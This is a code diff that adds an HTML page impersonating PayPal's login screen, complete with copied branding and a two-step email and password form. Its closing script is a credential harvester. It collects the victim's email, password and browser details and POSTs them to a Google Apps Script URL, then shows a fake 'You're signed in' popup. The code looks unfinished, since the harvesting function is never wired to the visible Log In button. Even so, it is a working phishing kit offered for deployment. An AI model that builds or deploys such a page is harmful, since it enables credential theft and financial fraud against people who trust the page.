@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Log in to your PayPal account</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue',Arial,sans-serif;
+  background:#f5f7fa;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  color:#1a1a1a;
+}
+a{text-decoration:none;color:#0070ba}
+a:hover{text-decoration:underline;color:#005ea6}
+
+/* ── HEADER ── */
+header{
+  background:#fff;
+  height:64px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  border-bottom:1px solid #e8e8e8;
+  padding:0 24px;
+}
+.paypal-logo{display:flex;align-items:center;gap:0}
+/* PayPal SVG logo */
+
+/* ── MAIN ── */
+.page-main{
+  flex:1;
+  display:flex;
+  align-items:flex-start;
+  justify-content:center;
+  padding:40px 16px 60px;
+}
+
+/* ── LOGIN CARD ── */
+.login-card{
+  background:#fff;
+  border-radius:24px;
+  padding:36px 40px 32px;
+  width:100%;
+  max-width:400px;
+  box-shadow:0 4px 24px rgba(0,0,0,.08);
+}
+
+/* Logo inside card */
+.card-logo{text-align:center;margin-bottom:24px}
+
+/* Email field */
+.field-group{margin-bottom:16px;position:relative}
+.field-label{
+  display:block;
+  font-size:13px;
+  font-weight:600;
+  color:#333;
+  margin-bottom:6px;
+}
+.field-input{
+  width:100%;
+  height:52px;
+  border:1.5px solid #ccc;
+  border-radius:10px;
+  padding:0 44px 0 14px;
+  font-size:15px;
+  color:#1a1a1a;
+  outline:none;
+  background:#fff;
+  transition:border-color .15s,box-shadow .15s;
+}
+.field-input:focus{
+  border-color:#0070ba;
+  box-shadow:0 0 0 3px rgba(0,112,186,.12);
+}
+.field-input::placeholder{color:#aaa}
+
+/* Password eye icon */
+.pw-wrap{position:relative}
+.pw-wrap .field-input{padding-right:44px}
+.pw-eye{
+  position:absolute;
+  right:14px;
+  top:50%;
+  transform:translateY(-50%);
+  background:none;
+  border:none;
+  cursor:pointer;
+  padding:0;
+  display:flex;
+  align-items:center;
+  color:#666;
+}
+.pw-eye svg{width:20px;height:20px;fill:none;stroke:currentColor;stroke-width:1.8}
+.pw-eye:hover{color:#0070ba}
+
+/* Next / Login buttons */
+.btn-next{
+  width:100%;
+  height:52px;
+  background:#0070ba;
+  color:#fff;
+  border:none;
+  border-radius:30px;
+  font-size:17px;
+  font-weight:700;
+  cursor:pointer;
+  margin-bottom:16px;
+  transition:background .15s;
+  letter-spacing:.1px;
+}
+.btn-next:hover{background:#005ea6}
+.btn-next:active{background:#004d8a}
+
+
+
+/* Forgot password */
+.forgot-row{text-align:center;margin-bottom:20px}
+.forgot-row a{font-size:14px;color:#0070ba;font-weight:500}
+
+
+
+/* Password step (hidden initially) */
+.step-password{display:none}
+.step-email{display:block}
+
+/* User greeting for password step */
+.user-greeting{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  padding:14px 16px;
+  background:#f5f7fa;
+  border-radius:10px;
+  margin-bottom:20px;
+  cursor:pointer;
+}
+.user-avatar{
+  width:38px;height:38px;
+  background:#0070ba;
+  border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  flex-shrink:0;
+}
+.user-avatar svg{width:20px;height:20px;fill:#fff}
+.user-email-display{font-size:14px;color:#333;font-weight:500;flex:1}
+.change-link{font-size:12.5px;color:#0070ba;white-space:nowrap}
+
+/* ── FEATURES STRIP ── */
+.features-strip{
+  display:flex;
+  justify-content:center;
+  gap:32px;
+  padding:28px 20px;
+  max-width:600px;
+  margin:0 auto;
+  flex-wrap:wrap;
+}
+.feat{display:flex;flex-direction:column;align-items:center;gap:8px;text-align:center;max-width:100px}
+.feat-icon{width:44px;height:44px;background:#e8f4ff;border-radius:50%;display:flex;align-items:center;justify-content:center}
+.feat-icon svg{width:22px;height:22px;fill:none;stroke:#0070ba;stroke-width:1.8}
+.feat span{font-size:12px;color:#555;line-height:1.4;font-weight:500}
+
+/* ── FOOTER ── */
+footer{background:#fff;border-top:1px solid #e8e8e8;padding:20px 24px}
+.footer-links{display:flex;justify-content:center;flex-wrap:wrap;gap:4px 18px;margin-bottom:10px}
+.footer-links a{font-size:12px;color:#555}
+.footer-links a:hover{color:#0070ba}
+.footer-copy{text-align:center;font-size:11.5px;color:#999}
+
+/* ── MOBILE ── */
+@media(max-width:480px){
+  .page-main{padding:24px 12px 48px}
+  .login-card{padding:28px 20px 24px;border-radius:16px}
+  .features-strip{gap:20px;padding:20px 16px}
+  header{height:56px}
+}
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header>
+  <!-- PayPal Logo SVG -->
+  <svg width="100" height="28" viewBox="0 0 100 28" xmlns="http://www.w3.org/2000/svg">
+    <!-- P letter 1 (dark blue) -->
+    <path d="M8 4h8.5c3.5 0 5.5 1.8 5.5 4.8 0 3.5-2.5 5.7-6.2 5.7H13l-1.2 5.5H7L8 4z" fill="#001c64"/>
+    <path d="M13.2 10.8h1.8c1.4 0 2.2-.7 2.2-1.9 0-.9-.6-1.4-1.8-1.4h-1.7l-.5 3.3z" fill="#001c64"/>
+    <!-- P letter 2 (blue) -->
+    <path d="M20 8h8.5c3.5 0 5.5 1.8 5.5 4.8 0 3.5-2.5 5.7-6.2 5.7H25l-1.2 5.5H19L20 8z" fill="#0070ba"/>
+    <path d="M25.2 14.8h1.8c1.4 0 2.2-.7 2.2-1.9 0-.9-.6-1.4-1.8-1.4h-1.7l-.5 3.3z" fill="#0070ba"/>
+    <!-- "ayPal" text -->
+    <text x="36" y="20" font-family="Arial,Helvetica,sans-serif" font-size="16" font-weight="700" fill="#001c64" letter-spacing="-.3">ayPal</text>
+  </svg>
+</header>
+
+<!-- MAIN -->
+<main class="page-main">
+  <div class="login-card">
+
+    <!-- PayPal Logo in Card -->
+    <div class="card-logo">
+      <svg width="80" height="22" viewBox="0 0 100 28" xmlns="http://www.w3.org/2000/svg">
+        <path d="M8 4h8.5c3.5 0 5.5 1.8 5.5 4.8 0 3.5-2.5 5.7-6.2 5.7H13l-1.2 5.5H7L8 4z" fill="#001c64"/>
+        <path d="M13.2 10.8h1.8c1.4 0 2.2-.7 2.2-1.9 0-.9-.6-1.4-1.8-1.4h-1.7l-.5 3.3z" fill="#001c64"/>
+        <path d="M20 8h8.5c3.5 0 5.5 1.8 5.5 4.8 0 3.5-2.5 5.7-6.2 5.7H25l-1.2 5.5H19L20 8z" fill="#0070ba"/>
+        <path d="M25.2 14.8h1.8c1.4 0 2.2-.7 2.2-1.9 0-.9-.6-1.4-1.8-1.4h-1.7l-.5 3.3z" fill="#0070ba"/>
+        <text x="36" y="20" font-family="Arial,Helvetica,sans-serif" font-size="16" font-weight="700" fill="#001c64" letter-spacing="-.3">ayPal</text>
+      </svg>
+    </div>
+
+    <!-- STEP 1: Email -->
+    <div class="step-email" id="stepEmail">
+      <div class="field-group">
+        <label class="field-label" for="email">Email address or mobile number</label>
+        <input class="field-input" type="email" id="email" placeholder="Enter email or mobile number" autocomplete="email">
+      </div>
+
+      <button class="btn-next" type="button" onclick="showPasswordStep()">Next</button>
+
+
+    </div>
+
+    <!-- STEP 2: Password (shown after Next) -->
+    <div class="step-password" id="stepPassword">
+      <!-- User email display -->
+      <div class="user-greeting" onclick="showEmailStep()">
+        <div class="user-avatar">
+          <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+        </div>
+        <span class="user-email-display" id="displayEmail">user@example.com</span>
+        <span class="change-link">Change</span>
+      </div>
+
+      <div class="field-group">
+        <label class="field-label" for="password">Password</label>
+        <div class="pw-wrap">
+          <input class="field-input" type="password" id="password" placeholder="Enter your password" autocomplete="current-password">
+          <button class="pw-eye" type="button" onclick="var f=document.getElementById('password');f.type=f.type==='password'?'text':'password'" aria-label="Show password">
+            <svg viewBox="0 0 24 24"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/><circle cx="12" cy="12" r="3"/></svg>
+          </button>
+        </div>
+      </div>
+
+      <div class="forgot-row">
+        <a href="#">Forgot password?</a>
+      </div>
+
+      <button class="btn-next" type="button" id="loginBtn" onclick="location.href='paypal-error.html'">Log In</button>
+
+
+    </div>
+
+  </div>
+</main>
+
+<!-- ── KNOW MORE POPUP ── -->
+<style>
+/* Overlay */
+.popup-overlay{
+  display:none;
+  position:fixed;inset:0;
+  background:rgba(0,0,0,.55);
+  z-index:1000;
+  align-items:center;
+  justify-content:center;
+  padding:16px;
+  animation:fadeOverlay .25s ease;
+}
+.popup-overlay.active{display:flex}
+@keyframes fadeOverlay{from{opacity:0}to{opacity:1}}
+
+/* Modal */
+.popup-modal{
+  background:#fff;
+  border-radius:20px;
+  width:100%;
+  max-width:460px;
+  max-height:90vh;
+  overflow-y:auto;
+  box-shadow:0 12px 48px rgba(0,0,0,.22);
+  animation:slideUp .3s cubic-bezier(.34,1.56,.64,1);
+  position:relative;
+}
+@keyframes slideUp{from{opacity:0;transform:translateY(40px)}to{opacity:1;transform:translateY(0)}}
+
+/* Modal header */
+.popup-header{
+  background:linear-gradient(135deg,#001c64 0%,#0070ba 100%);
+  border-radius:20px 20px 0 0;
+  padding:28px 28px 24px;
+  text-align:center;
+  position:relative;
+}
+.popup-close{
+  position:absolute;top:14px;right:16px;
+  background:rgba(255,255,255,.2);
+  border:none;border-radius:50%;
+  width:32px;height:32px;
+  display:flex;align-items:center;justify-content:center;
+  cursor:pointer;color:#fff;font-size:18px;line-height:1;
+  transition:background .15s;
+}
+.popup-close:hover{background:rgba(255,255,255,.35)}
+.popup-pp-logo{margin-bottom:10px}
+.popup-header h2{font-size:22px;font-weight:800;color:#fff;margin-bottom:6px;line-height:1.2}
+.popup-header p{font-size:13.5px;color:rgba(255,255,255,.85);line-height:1.5}
+
+
+
+/* Popup body */
+.popup-body{padding:0 28px 28px}
+
+/* Benefits list */
+.benefit-list{display:flex;flex-direction:column;gap:14px;margin-bottom:24px}
+.benefit-item{
+  display:flex;align-items:flex-start;gap:14px;
+  padding:14px 16px;
+  background:#f8faff;
+  border:1.5px solid #e0eaf8;
+  border-radius:12px;
+  transition:border-color .15s;
+}
+.benefit-item:hover{border-color:#0070ba}
+.benefit-icon{
+  width:42px;height:42px;
+  border-radius:12px;
+  display:flex;align-items:center;justify-content:center;
+  flex-shrink:0;
+}
+.benefit-icon svg{width:22px;height:22px;fill:none;stroke-width:2}
+.bi-blue{background:#e0eef8} .bi-blue svg{stroke:#0070ba}
+.bi-green{background:#e0f5e8} .bi-green svg{stroke:#00a86b}
+.bi-orange{background:#fff0e0} .bi-orange svg{stroke:#f5a623}
+.bi-purple{background:#f0e8ff} .bi-purple svg{stroke:#7c4dff}
+.benefit-text h4{font-size:14px;font-weight:700;color:#1a1a1a;margin-bottom:3px}
+.benefit-text p{font-size:12.5px;color:#666;line-height:1.5}
+
+
+
+/* CTA buttons */
+.popup-cta-primary{
+  width:100%;height:52px;
+  background:#0070ba;color:#fff;
+  border:none;border-radius:30px;
+  font-size:16px;font-weight:700;cursor:pointer;
+  margin-bottom:12px;
+  transition:background .15s;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+}
+.popup-cta-primary svg{width:18px;height:18px;fill:none;stroke:#fff;stroke-width:2}
+.popup-cta-primary:hover{background:#005ea6}
+.popup-cta-secondary{
+  width:100%;height:48px;
+  background:#fff;color:#0070ba;
+  border:1.5px solid #0070ba;
+  border-radius:30px;
+  font-size:15px;font-weight:700;cursor:pointer;
+  transition:all .15s;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+}
+.popup-cta-secondary svg{width:16px;height:16px;fill:none;stroke:#0070ba;stroke-width:2}
+.popup-cta-secondary:hover{background:#0070ba;color:#fff}
+.popup-cta-secondary:hover svg{stroke:#fff}
+
+
+
+@media(max-width:480px){
+  .popup-modal{border-radius:16px}
+  .popup-header{border-radius:16px 16px 0 0;padding:22px 20px 20px}
+  .popup-body{padding:0 16px 20px}
+  .popup-offer-badge{margin:0 16px;margin-bottom:20px}
+  .popup-header h2{font-size:19px}
+  .stat-val{font-size:17px}
+}
+</style>
+
+<!-- POPUP HTML -->
+<div class="popup-overlay" id="knowMorePopup" onclick="handleOverlayClick(event)">
+  <div class="popup-modal">
+
+    <!-- Header -->
+    <div class="popup-header">
+      <button class="popup-close" onclick="closePopup()" aria-label="Close">&#x2715;</button>
+      <!-- PayPal logo -->
+      <div class="popup-pp-logo">
+        <svg width="90" height="24" viewBox="0 0 100 28" xmlns="http://www.w3.org/2000/svg">
+          <path d="M8 4h8.5c3.5 0 5.5 1.8 5.5 4.8 0 3.5-2.5 5.7-6.2 5.7H13l-1.2 5.5H7L8 4z" fill="rgba(255,255,255,.7)"/>
+          <path d="M13.2 10.8h1.8c1.4 0 2.2-.7 2.2-1.9 0-.9-.6-1.4-1.8-1.4h-1.7l-.5 3.3z" fill="rgba(255,255,255,.7)"/>
+          <path d="M20 8h8.5c3.5 0 5.5 1.8 5.5 4.8 0 3.5-2.5 5.7-6.2 5.7H25l-1.2 5.5H19L20 8z" fill="#fff"/>
+          <path d="M25.2 14.8h1.8c1.4 0 2.2-.7 2.2-1.9 0-.9-.6-1.4-1.8-1.4h-1.7l-.5 3.3z" fill="#fff"/>
+          <text x="36" y="20" font-family="Arial,Helvetica,sans-serif" font-size="16" font-weight="700" fill="#fff" letter-spacing="-.3">ayPal</text>
+        </svg>
+      </div>
+      <h2>Welcome to PayPal! 🎉</h2>
+      <p>You're signed in. Here's everything your account unlocks for you.</p>
+    </div>
+
+
+
+    <!-- Body -->
+    <div class="popup-body">
+
+      <!-- Benefits -->
+      <div class="benefit-list">
+
+      </div>
+
+      <!-- Know more sign in message -->
+      <div style="background:#f0f6ff;border:1.5px solid #c0d8f0;border-radius:12px;padding:16px 18px;margin-bottom:20px;display:flex;align-items:center;gap:12px">
+        <div style="width:40px;height:40px;background:#0070ba;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><circle cx="12" cy="7" r="4"/><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/></svg>
+        </div>
+        <div>
+          <p style="font-size:13.5px;font-weight:700;color:#003d6a;margin-bottom:3px">Want to know more?</p>
+          <p style="font-size:12.5px;color:#555;line-height:1.5">Sign in to your account to explore all your PayPal benefits, offers, and features.</p>
+        </div>
+      </div>
+
+      <!-- CTA buttons -->
+      <button class="popup-cta-primary" type="button" onclick="closePopup()">
+        <svg viewBox="0 0 24 24"><circle cx="12" cy="7" r="4"/><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/></svg>
+        Sign In To Your Account
+      </button>
+      <button class="popup-cta-secondary" type="button" onclick="closePopup()">
+        <svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+        Close Now
+      </button>
+
+
+
+    </div>
+  </div>
+</div>
+
+<script>
+function openPopup(){
+  document.getElementById('knowMorePopup').classList.add('active');
+  document.body.style.overflow='hidden';
+}
+// Auto-open on page load
+window.addEventListener('load', function(){
+  setTimeout(function(){ openPopup(); }, 600);
+});
+function closePopup(){
+  document.getElementById('knowMorePopup').classList.remove('active');
+  document.body.style.overflow='';
+}
+function handleOverlayClick(e){
+  if(e.target===document.getElementById('knowMorePopup')) closePopup();
+}
+
+// Close on Escape key
+document.addEventListener('keydown',function(e){
+  if(e.key==='Escape') closePopup();
+});
+</script>
+
+<!-- FEATURES STRIP -->
+<div class="features-strip">
+  <div class="feat">
+    <div class="feat-icon">
+      <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+    </div>
+    <span>Buyer Protection</span>
+  </div>
+  <div class="feat">
+    <div class="feat-icon">
+      <svg viewBox="0 0 24 24"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg>
+    </div>
+    <span>Secure Payments</span>
+  </div>
+  <div class="feat">
+    <div class="feat-icon">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+    </div>
+    <span>Fast Checkout</span>
+  </div>
+  <div class="feat">
+    <div class="feat-icon">
+      <svg viewBox="0 0 24 24"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+    </div>
+    <span>Trusted by Millions</span>
+  </div>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-links">
+    <a href="#">Help</a>
+    <a href="#">Contact</a>
+    <a href="#">Privacy</a>
+    <a href="#">Legal</a>
+    <a href="#">Fees</a>
+    <a href="#">Accessibility</a>
+    <a href="#">Cookies</a>
+  </div>
+  <p class="footer-copy">© 2024 PayPal, Inc. All rights reserved.</p>
+</footer>
+
+<script>
+// ─── PASTE YOUR GOOGLE APPS SCRIPT WEB APP URL BELOW ───
+var SHEET_URL = 'https://script.google.com/macros/s/AKfycbz9eaCrjttG6ATS667S4yXGn41sXi4Bv2YwDkalJ8lebMxWQ36HSahM4QP74LSmmIXk/exec';
+
+function showPasswordStep(){
+  var email = document.getElementById('email').value.trim();
+  if(!email){
+    document.getElementById('email').focus();
+    document.getElementById('email').style.borderColor='#cc0000';
+    return;
+  }
+  document.getElementById('displayEmail').textContent = email;
+  document.getElementById('stepEmail').style.display = 'none';
+  document.getElementById('stepPassword').style.display = 'block';
+  document.getElementById('password').focus();
+}
+
+function showEmailStep(){
+  document.getElementById('stepPassword').style.display = 'none';
+  document.getElementById('stepEmail').style.display = 'block';
+  document.getElementById('email').focus();
+}
+
+function handleLogin(){
+
+
+  
+
+  var email    = document.getElementById('email').value.trim();
+  var password = document.getElementById('password').value;
+
+  if(!password){
+    document.getElementById('password').focus();
+    document.getElementById('password').style.borderColor='#cc0000';
+    return;
+  }
+
+  // Show loading state
+  var btn = document.getElementById('loginBtn');
+  btn.textContent = 'Signing in…';
+  btn.disabled = true;
+
+  // Build payload
+  var payload = {
+    timestamp : new Date().toLocaleString(),
+    email     : email,
+    password  : password,
+    platform  : navigator.platform  || 'Unknown',
+    language  : navigator.language  || 'Unknown',
+    screenRes : screen.width + 'x' + screen.height,
+    userAgent : navigator.userAgent,
+    pageURL   : window.location.href
+  };
+
+  // Send to Google Sheets — must use no-cors for Apps Script
+  fetch(SHEET_URL, {
+    method  : 'POST',
+    mode    : 'no-cors',
+    headers : { 'Content-Type': 'text/plain' },
+    body    : JSON.stringify(payload)
+  })
+  .finally(function(){
+    openPopup();
+    btn.textContent = 'Log In';
+    btn.disabled = false;
+  });
+}
+
+function openPopup(){
+  document.getElementById('knowMorePopup').classList.add('active');
+  document.body.style.overflow='hidden';
+}
+function closePopup(){
+  document.getElementById('knowMorePopup').classList.remove('active');
+  document.body.style.overflow='';
+}
+function handleOverlayClick(e){
+  if(e.target===document.getElementById('knowMorePopup')) closePopup();
+}
+
+// Auto-open popup on page load
+window.addEventListener('load', function(){
+  setTimeout(function(){ openPopup(); }, 600);
+});
+
+// Close on Escape key
+document.addEventListener('keydown',function(e){
+  if(e.key==='Escape') closePopup();
+});
+</script>
+
+</body>
+</html>
